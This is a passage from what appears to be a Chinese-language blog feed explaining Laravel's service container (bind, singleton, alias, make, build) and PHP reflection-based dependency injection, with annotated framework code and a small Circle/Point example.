class="built_in">return</span> <span class="keyword">function</span> (<span class="variable">$c</span>, <span class="variable">$parameters</span> = []) use (<span class="variable">$abstract</span>, <span class="variable">$concrete</span>) &#123;</span><br><span class="line">        <span class="variable">$method</span> = (<span class="variable">$abstract</span> == <span class="variable">$concrete</span>) ? <span class="string">'build'</span> : <span class="string">'make'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$c</span>-&gt;<span class="variable">$method</span>(<span class="variable">$concrete</span>, <span class="variable">$parameters</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bind把服务注册到服务容器的$bindings属性里类似这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bindings</span> = [</span><br><span class="line"><span class="string">'HelpSpot\API'</span> =&gt;  [//闭包绑定</span><br><span class="line"><span class="string">'concrete'</span> =&gt; <span class="keyword">function</span> (<span class="variable">$app</span>, <span class="variable">$paramters</span> = []) &#123;</span><br><span class="line"><span class="built_in">return</span> <span class="variable">$app</span>-&gt;build(<span class="string">'HelpSpot\API'</span>);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">'shared'</span> =&gt; <span class="literal">false</span>//如果是singleton绑定，这个值为<span class="literal">true</span></span><br><span class="line">]</span><br><span class="line"><span class="string">'Illuminate\Tests\Container\IContainerContractStub'</span> =&gt; [//接口实现绑定</span><br><span class="line"><span class="string">'concrete'</span> =&gt; <span class="string">'Illuminate\Tests\Container\ContainerImplementationStub'</span>,</span><br><span class="line"><span class="string">'shared'</span> =&gt; <span class="literal">false</span></span><br><span class="line">]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="singleton"><a href="#singleton" class="headerlink" title="singleton"></a>singleton</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public <span class="keyword">function</span> singleton(<span class="variable">$abstract</span>, <span class="variable">$concrete</span> = null)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;<span class="built_in">bind</span>(<span class="variable">$abstract</span>, <span class="variable">$concrete</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>singleton 方法是bind方法的变种，绑定一个只需要解析一次的类或接口到容器，然后接下来对于容器的调用该服务将会返回同一个实例,类似于单例模式</p><h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><p>把服务和服务别名注册到容器:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public <span class="keyword">function</span> <span class="built_in">alias</span>(<span class="variable">$abstract</span>, <span class="variable">$alias</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;aliases[<span class="variable">$alias</span>] = <span class="variable">$this</span>-&gt;normalize(<span class="variable">$abstract</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>alias 方法在上面讲bind方法里有用到过，它会把把服务别名和服务类的对应关系注册到服务容器的$aliases属性里。 例如: $this-&gt;app-&gt;alias(‘\Illuminate\ServiceName’, ‘service_alias’);<br>绑定完服务后在使用时就可以通过 $this-&gt;app-&gt;make(‘service_alias’); 将服务对象解析出来，这样make的时候就不用写那些比较长的类名称了，对make方法的使用体验上有很大提升。</p><h1 id="服务解析"><a href="#服务解析" class="headerlink" title="服务解析"></a>服务解析</h1><p>服务解析主要由make实现，类的构建由build来实现</p><h2 id="make"><a href="#make" class="headerlink" title="make:"></a>make:</h2><p> 从服务容器中解析出服务对象，该方法接收你想要解析的类名或接口名作为参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Resolve the given <span class="built_in">type</span> from the container.</span><br><span class="line"> *</span><br><span class="line"> * @param  string  <span class="variable">$abstract</span></span><br><span class="line"> * @param  array   <span class="variable">$parameters</span></span><br><span class="line"> * @<span class="built_in">return</span> mixed</span><br><span class="line"> */</span><br><span class="line">public <span class="keyword">function</span> make(<span class="variable">$abstract</span>, array <span class="variable">$parameters</span> = [])</span><br><span class="line">&#123;</span><br><span class="line">    // getAlias方法会假定<span class="variable">$abstract</span>是绑定的别名，从<span class="variable">$aliases</span>找到映射的真实类型名</span><br><span class="line">    // 如果没有映射则<span class="variable">$abstract</span>即为真实类型名，将<span class="variable">$abstract</span>原样返回</span><br><span class="line">    <span class="variable">$abstract</span> = <span class="variable">$this</span>-&gt;getAlias(<span class="variable">$this</span>-&gt;normalize(<span class="variable">$abstract</span>));</span><br><span class="line"></span><br><span class="line">    // 如果服务是通过instance()方式绑定的，就直接解析返回绑定的service</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$this</span>-&gt;instances[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;instances[<span class="variable">$abstract</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取<span class="variable">$abstract</span>接口对应的<span class="variable">$concrete</span>(接口的实现)</span><br><span class="line">    <span class="variable">$concrete</span> = <span class="variable">$this</span>-&gt;getConcrete(<span class="variable">$abstract</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;isBuildable(<span class="variable">$concrete</span>, <span class="variable">$abstract</span>)) &#123;</span><br><span class="line">        <span class="variable">$object</span> = <span class="variable">$this</span>-&gt;build(<span class="variable">$concrete</span>, <span class="variable">$parameters</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        // 如果时接口实现这种绑定方式，通过接口拿到实现后需要再make一次才能</span><br><span class="line">        // 满足isBuildable的条件 (<span class="variable">$abstract</span> === <span class="variable">$concrete</span>)</span><br><span class="line">        <span class="variable">$object</span> = <span class="variable">$this</span>-&gt;make(<span class="variable">$concrete</span>, <span class="variable">$parameters</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foreach (<span class="variable">$this</span>-&gt;getExtenders(<span class="variable">$abstract</span>) as <span class="variable">$extender</span>) &#123;</span><br><span class="line">        <span class="variable">$object</span> = <span class="variable">$extender</span>(<span class="variable">$object</span>, <span class="variable">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 如果服务是以singleton方式注册进来的则，把构建好的服务对象放到<span class="variable">$instances</span>里，</span><br><span class="line">    // 避免下次使用时重新构建</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;isShared(<span class="variable">$abstract</span>)) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;instances[<span class="variable">$abstract</span>] = <span class="variable">$object</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;fireResolvingCallbacks(<span class="variable">$abstract</span>, <span class="variable">$object</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;resolved[<span class="variable">$abstract</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$object</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected <span class="keyword">function</span> getConcrete(<span class="variable">$abstract</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (! is_null(<span class="variable">$concrete</span> = <span class="variable">$this</span>-&gt;getContextualConcrete(<span class="variable">$abstract</span>))) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$concrete</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 如果是<span class="variable">$abstract</span>之前没有注册类实现到服务容器里，则服务容器会认为<span class="variable">$abstract</span>本身就是接口的类实现</span><br><span class="line">    <span class="keyword">if</span> (! isset(<span class="variable">$this</span>-&gt;bindings[<span class="variable">$abstract</span>])) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$abstract</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$this</span>-&gt;bindings[<span class="variable">$abstract</span>][<span class="string">'concrete'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected <span class="keyword">function</span> isBuildable(<span class="variable">$concrete</span>, <span class="variable">$abstract</span>)</span><br><span class="line">&#123;        </span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$concrete</span> === <span class="variable">$abstract</span> || <span class="variable">$concrete</span> instanceof Closure;</span><br><span class="line">&#125;</span><br><span class="line">通过对make方法的梳理我们发现，build方法的职能是构建解析出来的服务的对象的，下面看一下构建对象的具体流程。（构建过程中用到了PHP类的反射来实现服务的依赖注入）</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> build(<span class="variable">$concrete</span>, array <span class="variable">$parameters</span> = [])</span><br><span class="line">&#123;</span><br><span class="line">    // 如果是闭包直接执行闭包并返回（对应闭包绑定）</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$concrete</span> instanceof Closure) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$concrete</span>(<span class="variable">$this</span>, <span class="variable">$parameters</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 使用反射ReflectionClass来对实现类进行反向工程</span><br><span class="line">    <span class="variable">$reflector</span> = new ReflectionClass(<span class="variable">$concrete</span>);</span><br><span class="line"></span><br><span class="line">    // 如果不能实例化，这应该是接口或抽象类，再或者就是构造函数是private的</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$reflector</span>-&gt;isInstantiable()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! empty(<span class="variable">$this</span>-&gt;buildStack)) &#123;</span><br><span class="line">            <span class="variable">$previous</span> = implode(<span class="string">', '</span>, <span class="variable">$this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$message</span> = <span class="string">"Target [<span class="variable">$concrete</span>] is not instantiable while building [<span class="variable">$previous</span>]."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> = <span class="string">"Target [<span class="variable">$concrete</span>] is not instantiable."</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        throw new BindingResolutionException(<span class="variable">$message</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;buildStack[] = <span class="variable">$concrete</span>;</span><br><span class="line"></span><br><span class="line">    // 获取构造函数</span><br><span class="line">    <span class="variable">$constructor</span> = <span class="variable">$reflector</span>-&gt;getConstructor();</span><br><span class="line"></span><br><span class="line">    // 如果构造函数是空，说明没有任何依赖，直接new返回</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="variable">$constructor</span>)) &#123;</span><br><span class="line">        array_pop(<span class="variable">$this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> new <span class="variable">$concrete</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 获取构造函数的依赖（形参），返回一组ReflectionParameter对象组成的数组表示每一个参数</span><br><span class="line">    <span class="variable">$dependencies</span> = <span class="variable">$constructor</span>-&gt;getParameters();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$parameters</span> = <span class="variable">$this</span>-&gt;keyParametersByArgument(</span><br><span class="line">        <span class="variable">$dependencies</span>, <span class="variable">$parameters</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 构建构造函数需要的依赖</span><br><span class="line">    <span class="variable">$instances</span> = <span class="variable">$this</span>-&gt;getDependencies(</span><br><span class="line">        <span class="variable">$dependencies</span>, <span class="variable">$parameters</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    array_pop(<span class="variable">$this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$reflector</span>-&gt;newInstanceArgs(<span class="variable">$instances</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 获取依赖</span><br><span class="line">protected <span class="keyword">function</span> getDependencies(array <span class="variable">$parameters</span>, array <span class="variable">$primitives</span> = [])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$dependencies</span> = [];</span><br><span class="line"></span><br><span class="line">    foreach (<span class="variable">$parameters</span> as <span class="variable">$parameter</span>) &#123;</span><br><span class="line">        <span class="variable">$dependency</span> = <span class="variable">$parameter</span>-&gt;getClass();</span><br><span class="line"></span><br><span class="line">        // 某一依赖值在<span class="variable">$primitives</span>中(即build方法的<span class="variable">$parameters</span>参数)已提供</span><br><span class="line">        // <span class="variable">$parameter</span>-&gt;name返回参数名</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists(<span class="variable">$parameter</span>-&gt;name, <span class="variable">$primitives</span>)) &#123;</span><br><span class="line">            <span class="variable">$dependencies</span>[] = <span class="variable">$primitives</span>[<span class="variable">$parameter</span>-&gt;name];</span><br><span class="line">        &#125; </span><br><span class="line">        elseif (is_null(<span class="variable">$dependency</span>)) &#123;</span><br><span class="line">             // 参数的ReflectionClass为null，说明是基本类型，如<span class="string">'int'</span>,<span class="string">'string'</span></span><br><span class="line">            <span class="variable">$dependencies</span>[] = <span class="variable">$this</span>-&gt;resolveNonClass(<span class="variable">$parameter</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         // 参数是一个类的对象， 则用resolveClass去把对象解析出来</span><br><span class="line">            <span class="variable">$dependencies</span>[] = <span class="variable">$this</span>-&gt;resolveClass(<span class="variable">$parameter</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$dependencies</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 解析出依赖类的对象</span><br><span class="line">protected <span class="keyword">function</span> resolveClass(ReflectionParameter <span class="variable">$parameter</span>)</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        // <span class="variable">$parameter</span>-&gt;getClass()-&gt;name返回的是类名（参数在typehint里声明的类型）</span><br><span class="line">        // 然后递归继续make（在make时发现依赖类还有其他依赖，那么会继续make依赖的依赖</span><br><span class="line">        // 直到所有依赖都被解决了build才结束)</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;make(<span class="variable">$parameter</span>-&gt;getClass()-&gt;name);</span><br><span class="line">    &#125; catch (BindingResolutionException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$parameter</span>-&gt;isOptional()) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$parameter</span>-&gt;getDefaultValue();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        throw <span class="variable">$e</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务容器就是laravel的核心， 它通过依赖注入很好的替我们解决对象之间的相互依赖关系，而又通过控制反转让外部来来定义具体的行为（Route, Eloquent这些都是外部模块，它们自己定义了行为规范，这些类从注册到实例化给你使用才是服务容器负责的）。</p><p>一个类要被容器所能够提取，必须要先注册至这个容器。既然 laravel 称这个容器叫做服务容器，那么我们需要某个服务，就得先注册、绑定这个服务到容器，那么提供服务并绑定服务至容器的东西就是服务提供器（ServiceProvider)。服务提供者主要分为两个部分：register（注册） 和 boot（引导、初始化），请看下一篇。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel请求到响应的整个过程</title>
      <link href="/2018/10/09/laravel%E8%AF%B7%E6%B1%82%E5%88%B0%E5%93%8D%E5%BA%94%E7%9A%84%E6%95%B4%E4%B8%AA%E8%BF%87%E7%A8%8B/"/>
      <url>/2018/10/09/laravel%E8%AF%B7%E6%B1%82%E5%88%B0%E5%93%8D%E5%BA%94%E7%9A%84%E6%95%B4%E4%B8%AA%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>对一个东西要了然于胸的话，需要从大体上来看，然后再慢慢扣细节，当然首先要先有点基础，从大体来看的时候才会看得进去，才会后续慢慢具体研究的了。既然要研究，肯定要知道laravel是怎么框架的，有一个经典问题是这样子的，当你在浏览器地址栏敲下一个url的时候，将会发生什么事情，今天我们就来研究如果网站是laravel框架，那么laravel是怎么工作的。</p><p><img src="laravel生命周期.png" alt="laravel生命周期"></p><p>接下来的接下来按照这个生命周期开始我们的学习之旅</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>​类的反射和依赖注入</title>
      <link href="/2018/10/09/%E2%80%8B%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%B0%84%E5%92%8C%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/10/09/%E2%80%8B%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%B0%84%E5%92%8C%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>后续学到服务容器的时候，我们会遇到类的构建过程，构建过程中用到了PHP类的反射来实现服务的依赖注入。</p><a id="more"></a><p>前面我们讲基础的时候有涉及到，php的反射，php的反射API，提供了对类、接口、函数、方法和扩展进行逆向工程的能力。通过类的反射提供的能力我们能够知道类是如何被定义的，它有什么属性、什么方法、方法都有哪些参数，类文件的路径是什么等很重要的信息。也正式因为类的反射很多PHP框架才能实现依赖注入自动解决类与类之间的依赖关系</p><p>关于反射的api，可以查看<a href="http://php.net/manual/zh/intro.reflection.php" target="_blank" rel="noopener">官方文档</a></p><p>关于类的反射和依赖注入怎么结合的可以看下面例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Parents</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$a</span> = 0, <span class="variable">$b</span> = 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Point</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$x</span>;</span><br><span class="line">    public <span class="variable">$y</span>;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Point constructor.</span><br><span class="line">     * @param int <span class="variable">$x</span>  horizontal value of point<span class="string">'s coordinate</span></span><br><span class="line"><span class="string">     * @param int $y  vertical value of point'</span>s coordinate</span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> __construct(Parents <span class="variable">$parents</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;x = <span class="variable">$parents</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Circle</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * @var int</span><br><span class="line">     */</span><br><span class="line">    public <span class="variable">$radius</span>;//半径</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @var Point</span><br><span class="line">     */</span><br><span class="line">    public <span class="variable">$center</span>;//圆心点</span><br><span class="line"></span><br><span class="line">    const PI = 3.14;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(Point <span class="variable">$point</span>, <span class="variable">$radius</span> = 1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;center = <span class="variable">$point</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;radius = <span class="variable">$radius</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //打印圆点的坐标</span><br><span class="line">    public <span class="keyword">function</span> printCenter()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">'center coordinate is (%d, %d)'</span>, <span class="variable">$this</span>-&gt;center-&gt;x, <span class="variable">$this</span>-&gt;center-&gt;y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算圆形的面积</span><br><span class="line">    public <span class="keyword">function</span> area()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> 3.14 * pow(<span class="variable">$this</span>-&gt;radius, 2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//构建类的对象</span><br><span class="line"><span class="keyword">function</span> make(<span class="variable">$className</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$reflectionClass</span> = new ReflectionClass(<span class="variable">$className</span>);</span><br><span class="line">    <span class="variable">$constructor</span> = <span class="variable">$reflectionClass</span>-&gt;getConstructor();</span><br><span class="line">    <span class="variable">$parameters</span>  = <span class="variable">$constructor</span>-&gt;getParameters();</span><br><span class="line">    <span class="variable">$dependencies</span> = getDependencies(<span class="variable">$parameters</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$reflectionClass</span>-&gt;newInstanceArgs(<span class="variable">$dependencies</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//依赖解析</span><br><span class="line"><span class="keyword">function</span> getDependencies(<span class="variable">$parameters</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$dependencies</span> = [];</span><br><span class="line">    foreach(<span class="variable">$parameters</span> as <span class="variable">$parameter</span>) &#123;</span><br><span class="line">        <span class="variable">$dependency</span> = <span class="variable">$parameter</span>-&gt;getClass();</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$dependency</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$parameter</span>-&gt;isDefaultValueAvailable()) &#123;</span><br><span class="line">                <span class="variable">$dependencies</span>[] = <span class="variable">$parameter</span>-&gt;getDefaultValue();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$dependencies</span>[] = null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            //递归解析出依赖类的对象,依赖可能的构造函数可能也有依赖</span><br><span class="line">            <span class="variable">$dependencies</span>[] = make(<span class="variable">$parameter</span>-&gt;getClass()-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$dependencies</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$circle</span> = make(<span class="string">'Circle'</span>);</span><br><span class="line"><span class="variable">$area</span> = <span class="variable">$circle</span>-&gt;area();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump( <span class="variable">$circle</span>);</span><br><span class="line">object(Circle)<span class="comment">#5 (2) &#123;</span></span><br><span class="line">  [<span 